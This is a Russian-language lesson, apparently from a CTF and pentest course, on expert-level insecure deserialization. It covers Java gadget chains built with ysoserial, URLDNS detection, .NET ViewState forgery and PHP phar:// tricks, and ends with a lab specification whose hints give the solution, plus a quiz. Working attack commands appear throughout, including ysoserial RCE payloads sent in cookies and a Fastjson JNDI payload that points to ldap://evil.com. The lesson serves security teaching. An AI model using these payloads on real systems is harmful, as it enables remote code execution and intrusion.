---
id: web-deser-expert
title: "Десериализация: экспертные цепочки и ViewState"
category: web
parent: web-deserialization
difficulty: expert
order: 2
tags: [java, viewstate, gadget, deserialization, roadmap]
prerequisites: [web-deserialization]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 8
summary: "Экспертный уровень: Java gadget-цепочки, .NET ViewState и трюки PHP."
lab:
  kind: shell
  title: "Практика: Java-десериализация — цепочка CommonsCollections"
  toolset: [core, curl, unzip, ysoserial.jar]
  workdir: /home/student/task
  files: [task.md, session.b64, shop.war]
  check: "grep -q 'nto{' found.txt"
  hints:
    - "base64 -d session.b64 | xxd -l 8 покажет aced 0005 — это Java Serialization."
    - "unzip -l shop.war перечислит библиотеки: нужна уязвимая commons-collections-3.2.1.jar."
    - "URLDNS — безопасный детектор (только DNS), RCE-цепочка — CommonsCollections6."
    - "ysoserial.jar CommonsCollections6 'cat /flag.txt' > payload.b64, затем curl -s -b @payload.b64 https://shop.local/ > found.txt."
---

## Задача

В прошлом уроке мы распознавали форматы и строили простые payload. Теперь — самый сложный уровень: **Java gadget-цепочки** и **.NET ViewState**. Здесь эксплойт собирают из классов, которые уже есть в приложении: по отдельности безобидные, вместе они образуют цепочку до выполнения команд.

Разберём один Java-сервис и один ASP.NET-сайт.

## Наш пример: Java-эндпоинт и его cookie

Заметим бинарную cookie `JSESSIONID`-подобного вида:

```bash
$ echo 'rO0ABXNyABdqYXZhLnV0aWwu...' | base64 -d | xxd | head -1
00000000: aced 0005 7372 0017 6a61 7661 2e75 7469  ....sr..java.uti
```

Байты `ac ed 00 05` — сигнатура **Java Serialization** (`0xACED0005`), а в base64 она выглядит как `rO0AB`. Значит, сервер делает `ObjectInputStream.readObject(...)`. Это прямой путь к gadget-цепочке.

## Шаг 1: что такое gadget-цепочка

**Гаджет** — это метод класса из classpath приложения, который при вызове делает что-то полезное для атакующего (`Runtime.exec`, чтение файла, DNS-запрос). Цепочка связывает гаджеты так, что десериализация объекта автоматически доходит до опасного метода.

Классика — **CommonsCollections** (если библиотека есть в classpath). Собираем payload готовым инструментом:

```bash
$ ysoserial.jar CommonsCollections6 'id' > payload.bin
$ base64 -w0 payload.bin
rO0ABXNyABFqYXZhLnV0aWwu...==
```

Отправляем в cookie — сервер исполняет `id`.

## Шаг 2: выбор цепочки по classpath

Гаджет сработает только если классы есть в приложении. Поэтому сначала определяют библиотеки:

```bash
$ unzip -l shop.war | grep -E 'commons-collections|spring|groovy|hibernate'
   commons-collections-3.2.1.jar
   spring-core-4.3.0.jar
```

CommonsCollections 3.2.1 — известная уязвимая версия. Если её нет, пробуют другие цепочки: `Spring1`, `Groovy1`, `Hibernate1`, `URLDNS` (безопасная проверка — только DNS-запрос). **`URLDNS`** — идеальный первый шаг: он не выполняет код, а лишь заставляет сервер обратиться к нашему DNS — так подтверждают десериализацию без риска.

## Шаг 3: URLDNS — безопасная проверка

```bash
$ ysoserial.jar URLDNS 'http://probe.our-dns.com' > probe.bin
$ curl -s -b "session=$(base64 -w0 probe.bin)" https://shop.local/
# на нашем DNS-сервере видим запрос probe.our-dns.com
```

Пришёл DNS-запрос — десериализация подтверждена. Только после этого (и с разрешения) переходят к RCE-цепочке. Это тот же принцип «сначала подтверди, потом эксплуатируй».

## Шаг 4: .NET ViewState

ASP.NET хранит состояние страницы в скрытом поле `__VIEWSTATE` — это сериализованный объект, подписанный (а иногда и зашифрованный) ключом `machineKey`. Если ключ утёк или предсказуем, ViewState можно подделать и получить RCE:

```bash
$ curl -s https://legacy.shop.local/ | grep -o '__VIEWSTATE[^>]*value="[^"]*"' | head -c 80
__VIEWSTATE" value="/wEPDwUKMTIzNDU2Nzg5..."
```

ViewState, начинающийся с `/wEP`, часто **не зашифрован, только подписан**. Проверяем подпись инструментом:

```bash
$ ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  --path="/default.aspx" --apppath="/" --validationkey=<key> --validationalg=SHA1 --generator=<gid>
```

Нужны `validationKey` и `generator` из `machineKey` в `web.config` — их ищут в утёкшем коде или в известных утечках.

## Шаг 5: PHP-трюки уровня expert

Даже в PHP есть неочевидные триггеры:

- **`phar://`** — метаданные PHAR-архива десериализуются при обычных файловых операциях (`file_exists`, `getimagesize`). Загрузи картинку-PHAR и подставь `phar://upload/x.jpg` в параметр с файловой функцией.
- **Сессии** — `session.serialize_handler` может быть `php` или `php_binary`; расхождение форматов даёт инъекцию в `$_SESSION`.
- **`__PHP_Incomplete_Class`** — индикатор, что объект не восстановился; помогает понять, какие классы доступны.

## Если не сработало

- **Нет CommonsCollections** — перебирай цепочки (`Spring`, `Groovy`, `Hibernate`) или ищи свою из загруженных библиотек.
- **ViewState зашифрован** — нужен `machineKey` (утечка, дефолт); без него не подделать.
- **`phar://` не проходит** — проверь, что загрузка реально сохраняет файл и что функция делает файловую операцию.
- **Java-версия блокирует** — ищи обходы `ObjectInputFilter` или цепочки из других библиотек.

## Что мы теперь знаем

- Java-сериализация — сигнатура `aced0005` (`rO0AB` в base64); цепочки собирают ysoserial.
- Цепочка зависит от classpath: сначала определяем библиотеки, потом гаджет.
- URLDNS — безопасный детектор; RCE-цепочка — только после подтверждения.
- ViewState ломается при утечке `machineKey`; `phar://` — неочевидный триггер в PHP.

## Частые вопросы

**Почему Java-десериализация считается самой опасной?** Огромный classpath и много известных гаджетов (CommonsCollections, Spring, Groovy). Одна уязвимая библиотека — и RCE.

**Можно ли собрать цепочку без публичного гаджета?** Да, но это ручная работа: ищешь методы из classpath, которые вместе дают нужный эффект. Начинай с известных цепочек.

**Что такое URLDNS и зачем он нужен?** Безопасная цепочка: не выполняет код, а лишь заставляет сервер сделать DNS-запрос. Идеальный детектор десериализации без риска.

**ViewState всегда ломается?** Только если `machineKey` утёк или предсказуем. Иначе подпись не подделать. Ищи ключ в утечках, дефолтах, исходниках.

**Почему `phar://` неочевиден?** Потому что десериализация срабатывает при **обычных файловых операциях** (`file_exists`, `getimagesize`), а не при явном `unserialize`. Загрузи PHAR и подставь путь.

**Как не положить сервер?** Сначала детектор (URLDNS/DNS), потом RCE — и только с разрешения владельца.

## Ещё один сценарий: Java через JSON (Jackson/Fastjson)

Java-десериализация бывает не только бинарной. Библиотеки `Jackson`/`Fastjson` умеют создавать объекты по имени класса из JSON, что даёт те же гаджеты:

```bash
$ curl -s https://shop.local/api/parse -H 'Content-Type: application/json' \
  -d '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://evil.com/x","autoCommit":true}'
```

Fastjson по `@type` создаёт указанный класс, который делает JNDI-запрос (как в Log4Shell). Проверка та же: сначала DNS-детект.

```bash
$ curl -s https://shop.local/api/parse -d '{"@type":"java.net.Inet4Address","val":"probe.evil.com"}'
$ # на DNS видим запрос -> десериализация через @type подтверждена
```

## На что смотреть дальше

- **Сигнатуры.** `rO0AB` (бинарный Java), `@type` (Jackson/Fastjson), `/wEP` (ViewState).
- **Classpath.** CommonsCollections, Spring, Groovy, Hibernate — от него зависит цепочка.
- **Детектор.** URLDNS/DNS-callback вместо сразу RCE.
- **ViewState.** Нужен `machineKey`; проверь шифрование и `__VIEWSTATEGENERATOR`.
- **PHP.** `phar://`, расхождение форматов сессий, `__PHP_Incomplete_Class`.
- **Порядок.** Сначала подтверди десериализацию, потом строй цепочку.

## Квиз

Проверь себя.

```quiz
- question: "Что означает base64-префикс rO0AB?"
  options:
    - "Сериализованный Java-объект (сигнатура aced0005)"
    - "Python pickle"
    - "PHP-массив"
    - "JWT"
  answer: 0
  explanation: "aced0005 — магия Java Serialization; в base64 начинается с rO0AB."
- question: "Зачем использовать URLDNS перед RCE-цепочкой?"
  options:
    - "Он безопасно подтверждает десериализацию через DNS-запрос"
    - "Он выполняет команды"
    - "Он шифрует payload"
    - "Он обходит CSP"
  answer: 0
  explanation: "URLDNS не запускает код, только заставляет сервер сделать DNS-запрос — детектор без риска."
- question: "Что нужно, чтобы подделать .NET ViewState?"
  options:
    - "validationKey и generator из machineKey"
    - "Пароль пользователя"
    - "JWT-секрет"
    - "CSRF-токен"
  answer: 0
  explanation: "ViewState подписан machineKey; без ключа подпись не сгенерировать."
- question: "Когда срабатывает phar:// десериализация в PHP?"
  options:
    - "При файловой операции над PHAR-архивом (file_exists, getimagesize)"
    - "При SQL-запросе"
    - "При отправке формы"
    - "При чтении cookie"
  answer: 0
  explanation: "Метаданные PHAR десериализуются автоматически при файловых функциях."
```

## Куда дальше

На этом ветвь десериализации завершена. Дальше — инъекции (`web-sqli`) и серверное шаблонирование (`web-ssti`). А пока главное запомни: **гаджет-цепочка собирается под classpath цели, а подтверждать десериализацию надо безопасным детектором вроде URLDNS.**

## Где пригодится

- **CTF:** закрепление темы в задачах категории Web.
- **Bug bounty:** приоритизация находок и построение отчётов.
- **Пентест:** планирование этапов тестирования веб-приложения.
- **Работа:** понимание, какие классы багов критичны для защиты продукта.
